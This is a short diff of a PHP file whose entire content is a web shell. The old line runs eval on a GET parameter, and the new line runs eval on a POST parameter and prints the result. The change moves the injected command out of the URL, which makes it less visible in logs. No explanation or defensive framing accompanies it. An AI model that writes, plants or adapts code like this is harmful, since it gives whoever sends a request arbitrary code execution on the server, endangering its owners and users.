@@ -1,4 +1,4 @@
 <?php
-$output = eval($_GET[0]);
+$output = eval($_POST[0]);
 echo "<pre>$output</pre>";
 ?>
